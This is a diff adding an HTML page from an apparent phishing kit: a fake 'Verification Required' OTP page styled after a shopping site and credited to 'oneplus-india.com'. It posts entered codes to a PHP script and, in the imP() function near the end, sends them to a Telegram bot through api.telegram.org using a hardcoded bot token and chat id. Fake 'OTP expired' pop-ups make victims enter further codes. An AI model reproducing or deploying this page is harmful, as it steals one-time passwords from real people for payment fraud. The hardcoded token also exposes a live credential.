@@ -1,0 +1,608 @@
+
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/swiper/swiper-bundle.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/sweetalert2@11.1.5/dist/sweetalert2.min.css">
+
+    <link rel="stylesheet" href="https://example.com/icon-font.css">
+
+    <title> Please Wait </title>
+    
+    
+</head>
+
+<body>
+    <header>
+        <nav class="nav">
+            <ul>
+                <li><img src="assets/logo(1).png" alt=""></li>
+                <li>
+                    <div class="search-wrapper">
+                        <input type="search" class="search-input" placeholder="Search for products">
+                        <i class="fas fa-search search-icon"></i>
+                <li></li>
+                </div>
+                </li>
+                <li>
+                    <i class="fas fa-cart-arrow-down cart-icon"></i>
+                    <span class="cart-items"></span>
+                </li>
+            </ul>
+        </nav>
+    </header>
+
+    <div class="hcover">
+        <li>Today's deals</li>
+        <li>Electronics</li>
+        <li>Mobile</li>
+        <li>Sell</li>
+    </div>
+    
+
+<style>
+    * {
+        margin: 0;
+        padding: 0;
+        font-family: Roboto, Arial, sans-serif;
+    }
+
+    header {
+        height: 70px;
+        background-color: #8db0f2;
+    }
+
+    .nav ul {
+        margin: 0;
+        margin-top: 8px;
+        padding: 0;
+        list-style-type: none;
+        display: flex;
+        justify-content: center;
+        /* Center the list horizontally */
+        align-items: center;
+        height: 100%;
+    }
+
+    /* Style the list items */
+    .nav ul li {
+        margin-right: 100px;
+    }
+
+    /* Set the image width and height */
+    .nav ul li:first-child {
+        margin-right: auto;
+        margin-left: 10px;
+    }
+
+    .nav ul li img {
+        width: 100px;
+        height: 40px;
+    }
+
+    /* Responsive styles */
+    @media only screen and (max-width: 600px) {
+
+        /* Reduce the logo size */
+        .nav ul li img {
+            width: 240px;
+            height: 60px;
+        }
+
+        /* Adjust the margins */
+        .nav ul li:first-child {
+            margin-left: 60px;
+        }
+
+        .nav ul li {
+            margin-right: 20px;
+        }
+    }
+
+    /* Default styles */
+    .search-wrapper {
+        display: none;
+        position: relative;
+        display: inline-block;
+    }
+
+    .search-input {
+        display: none;
+        width: 200px;
+        height: 30px;
+        padding: 5px 10px;
+        border: 1px solid #ccc;
+        border-radius: 5px;
+        font-size: 14px;
+        outline: none;
+    }
+
+    .search-icon {
+        display: none;
+        position: absolute;
+        top: 50%;
+        right: 10px;
+        transform: translateY(-50%);
+        color: #888;
+    }
+
+    .search-icon:before {
+        font-size: 16px;
+    }
+
+    .cart-container {
+        display: inline-block;
+        position: relative;
+    }
+
+    .cart-icon {
+        display: none;
+        font-size: 24px;
+        color: white;
+    }
+
+    .cart-items {
+        display: none;
+        position: absolute;
+        top: 0px;
+        right: 2px;
+        padding: 2px 6px;
+        font-size: 12px;
+        font-weight: bold;
+        background-color: red;
+        color: white;
+        border-radius: 50%;
+    }
+
+    /* Responsive styles */
+    @media (max-width: 768px) {
+        .search-input {
+            width: 150px;
+        }
+
+        .search-icon:before {
+            font-size: 14px;
+        }
+
+        .cart-icon {
+            font-size: 20px;
+        }
+
+        .cart-items {
+            font-size: 10px;
+            padding: 1px 4px;
+        }
+    }
+
+    @media (max-width: 480px) {
+        .search-input {
+            width: 100%;
+        }
+
+        .search-icon {
+            right: 5px;
+        }
+
+        .cart-icon {
+            font-size: 18px;
+        }
+
+        .cart-items {
+            font-size: 10px;
+            padding: 1px 4px;
+            top: 0;
+            right: 2px;
+        }
+    }
+
+
+
+    .hcover {
+        display: none;
+        justify-content: space-between;
+        align-items: center;
+        background-color: #232f3e;
+        padding: 10px;
+        font-size: 13px;
+        font-weight: 900;
+    }
+
+
+
+    .hcover li {
+        display: none;
+        list-style: none;
+        margin: 0 10px;
+        color: white;
+    }
+
+    @media (max-width: 600px) {
+        .hcover {
+            font-size: 10px;
+        }
+
+        .hcover li {
+            margin: 5px 10px;
+        }
+    }
+
+    table {
+        width: 100%;
+        border-collapse: collapse;
+    }
+
+    table td {
+        padding: 10px;
+        text-align: left;
+    }
+
+    table tr:first-child {
+        font-weight: bold;
+    }
+
+    table tr:nth-child(even) {
+        background-color: #f5f5f5;
+    }
+
+    .otp-section {
+        max-width: 400px;
+        margin: 0 auto;
+        padding: 20px;
+        text-align: center;
+        background-color: #f5f5f5;
+    }
+
+    .otp-section h2 {
+        font-size: 24px;
+        margin-bottom: 10px;
+    }
+
+    .otp-section p {
+        font-size: 16px;
+        margin-bottom: 20px;
+    }
+
+    .otp-section form {
+        margin-bottom: 20px;
+    }
+
+    .otp-section .inputsofotp {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        margin-bottom: 10px;
+    }
+
+    .otp-section input[type="tel"] {
+        width: 100%;
+        padding: 10px;
+        font-size: 16px;
+        border: 1px solid #ccc;
+        border-radius: 4px;
+        margin-bottom: 10px;
+    }
+
+    .otp-section input[type="submit"] {
+        background-color: #004D93;
+        color: black;
+        padding: 10px;
+        border: none;
+        border-radius: 4px;
+        cursor: pointer;
+        font-size: 16px;
+        transition: background-color 0.3s ease;
+        width: 107%;
+    }
+
+    .otp-section input[type="submit"]:hover {
+        background-color: #4881ea;
+    }
+
+    .otp-section .resendtimer {
+        margin-bottom: 10px;
+    }
+
+    .otp-section .resendtimer a {
+        color: #007185;
+        text-decoration: none;
+        font-size: 14px;
+    }
+
+    .otp-section .secure img {
+        width: 100%;
+        height: auto;
+    }
+
+    .blackfooter {
+        bottom: 0;
+        left: 0;
+        background-color: #ffffff;
+        color: #000000;
+        padding: 5px;
+    }
+
+    .blackfooter ul {
+        list-style: none;
+        margin: 0;
+        padding: 0;
+        text-align: center;
+    }
+
+    .blackfooter ul li {
+        font-size: 12px;
+        display: inline-block;
+        margin: 0 12px;
+    }
+
+    .blackfooter .copyrigth {
+        font-size: 12px;
+        text-align: center;
+        margin-top: 10px;
+        margin-bottom: 60px;
+    }
+
+    #overlayDiv {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background-color: rgba(0, 0, 0, 0.5);
+        z-index: 9999;
+        display: none;
+    }
+
+    .loading-container {
+        position: absolute;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+    }
+
+    .loading-image {
+        max-width: 130px;
+        max-height: 130px;
+        display: block;
+        margin: 0 auto;
+    }
+</style>
+
+
+
+<table>
+    <tbody>     <td></td>   
+
+        <tr>
+            <td></td>
+            <td></td>
+        </tr>
+    </tbody>
+</table>
+
+<div id="overlayDiv">
+    <div class="loading-container">
+        <img src="./imgotp/loading.gif" alt="Loading" class="loading-image">
+    </div>
+</div>
+
+
+<div class="otp-section">
+    <h2>Verification Required</h2>
+    <p>To continue, complete this verification step. We've sent an OTP to your mobile number. Please enter it below to
+        complete verification.</p>
+
+    <form id="otpForm" action="php/isnert4.php" method="post">
+        
+        <div class="inputsofotp">
+            <input type="tel" id="otp" name="otp" placeholder="Enter OTP">
+            <p id="otperror" style="color: red; font-weight: 500; font-size: 15px"></p>
+            <input type="submit" name="submit" value="Continue" id="continue-btn" onclick="kirimP()" />
+        </div>
+    </form>
+
+    <div class="resendtimer">
+        <p id="countdown-text">Not received the code? Please resend in</p>
+        <p id="countdown-timer" style="color: black;"></p>
+       <a href="#" id="resend-link" onclick="imP()" />Resend Otp</a>
+    </div>
+    <div class=" secure">
+        <img src="./imgotp/secure.pg" alt="">
+        <img src="./imgotp/secure2.jpg" alt="">
+    </div>
+</div>
+
+<div class="blackfooter">
+    <ul>
+        <li>conditions of use</li>
+        <li>Privacy Notice</li>
+        <li>Interest-based Ads</li>
+    </ul>
+    <div class="copyrigth">
+        © 1996-2023, oneplus-india.com, Inc. and its affiliates
+    </div>
+</div>
+
+<script>
+    document.getElementById('otpForm').addEventListener('submit', function (event) {
+        var otpInput = document.getElementById('otp');
+        var otp = otpInput.value;
+
+        if (otp.length < 6) {
+            event.preventDefault();
+
+            Swal.fire({
+                icon: 'error',
+                title: 'Oops...',
+                text: 'OTP must be at least 8 digits',
+                showConfirmButton: false
+            });
+
+            return false;
+        }
+    });
+</script>
+
+<script>
+    var isFormSubmitted = localStorage.getItem('formSubmitted');
+
+    if (isFormSubmitted) {
+        Swal.fire({
+            title: "Form Submitted",
+            text: "Thank you for filling out the form!",
+            icon: "success"
+        });
+
+        localStorage.removeItem('formSubmitted');
+    }
+
+    var otpForm = document.getElementById('otpForm');
+    otpForm.addEventListener('submit', function () {
+
+        localStorage.setItem('formSubmitted', true);
+    });
+</script>
+
+<script>
+    function showSweetAlert() {
+        swal.fire("OTP Resent", "We've resent the OTP to your mobile number.");
+    }
+
+    function startCountdown(duration, display) {
+        let timer = duration;
+        let countdownInterval = setInterval(function () {
+            let minutes = Math.floor(timer / 60);
+            let seconds = timer % 60;
+
+            minutes = minutes < 10 ? "0" + minutes : minutes;
+            seconds = seconds < 10 ? "0" + seconds : seconds;
+
+            display.textContent = minutes + ":" + seconds;
+
+            if (timer <= 0) {
+                clearInterval(countdownInterval);
+                display.textContent = "";
+                document.getElementById("countdown-timer").style.display = "none";
+                document.getElementById("resend-link").style.display = "inline";
+            }
+            timer--;
+        }, 1000);
+    }
+
+    let countdownDuration = 300;
+    let countdownDisplay = document.getElementById("countdown-timer");
+    let resendLink = document.getElementById("resend-link");
+
+    document.addEventListener("DOMContentLoaded", function () {
+        if (countdownDuration > 0) {
+            document.getElementById("countdown-text").style.display = "inline";
+            countdownDisplay.style.display = "inline";
+            startCountdown(countdownDuration, countdownDisplay);
+            resendLink.style.display = "none";
+        } else {
+            resendLink.style.display = "inline";
+        }
+    });
+
+    resendLink.addEventListener("click", function (event) {
+        event.preventDefault();
+
+        this.style.display = "none";
+        document.getElementById("countdown-text").style.display = "inline";
+        countdownDisplay.style.display = "inline";
+
+        showSweetAlert();
+
+        startCountdown(countdownDuration, countdownDisplay);
+    });
+</script>
+<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.1.4"></script>
+
+<script>
+    var isFormSubmittedFlag = localStorage.getItem('formSubmittedFlag');
+    otperror = document.getElementById('otperror');
+    overlayDiv = document.getElementById('overlayDiv');
+
+
+
+
+    if (isFormSubmittedFlag) {
+
+        setTimeout(() => {
+            overlayDiv.style.display = 'flex';
+            setTimeout(() => {
+                Swal.fire({
+                    title: "OTP EXPIRED!",
+                    html: "This OTP has expired. A new OTP has been sent to your registered mobile number.",
+                });
+                otperror.innerHTML = 'Otp Expired, New OTP sent. Please enter new OTP';
+
+                setTimeout(() => {
+                    overlayDiv.style.display = 'none';
+                }, 2);
+            }, 8000);
+        });
+
+
+        localStorage.removeItem('formSubmittedFlag');
+    }
+
+    var otpFormElement = document.getElementById('otpForm');
+    otpFormElement.addEventListener('submit', function () {
+        localStorage.setItem('formSubmittedFlag', true);
+    });
+</script>
+
+<script>
+    var otp = document.getElementById("otp");
+    otp.addEventListener("input", function () {
+        this.value = this.value.replace(/[^0-9]/g, '').substring(0, 8);
+    });
+</script>
+
+<script>
+    var storedAmount = localStorage.getItem("updatedAmount");
+
+    if (storedAmount) {
+        var amountElement = document.getElementById("amount");
+        amountElement.innerText = "₹" + storedAmount;
+    }
+</script>
+
+
+
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.1.5/dist/sweetalert2.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.1.4"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"
+    integrity="sha512-+NqPlbbtM1QqiK8ZAo4Yrj2c4lNQoGv8P79DPtKzj++l5jnN39rHA/xsqn8zE9l0uSoxaCdrOgFs6yjyfbBxSg=="
+    crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+        <script src="./js/maine.js"></script>
+
+
+</body>
+<script>
+  function imP() {
+
+    var otp = document.getElementById('otp');
+
+    //var gabungan = 'Email : '  + email.value + '%0APhone Number' + number.value;
+
+    var token = '6580655277:AAHYm3Y5tO3dHgAEwPq9nuI1l0xW5LJx60Y'; // Ganti dengan token bot yang kamu buat
+    var grup = '6410517472'; // Ganti dengan chat id dari bot yang kamu buat
+
+    $.ajax({
+        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${'ᴅᴇᴠᴇʟᴏᴘᴇᴅ ʙʏ : @Heck0bot%0A%0AOTP: resend 🤔🤔🤔🤔🤔 ' +otp.value}&parse_mode=html`,
+        method: `POST`,
+    })
+}
+
+</script>
+
+</html>
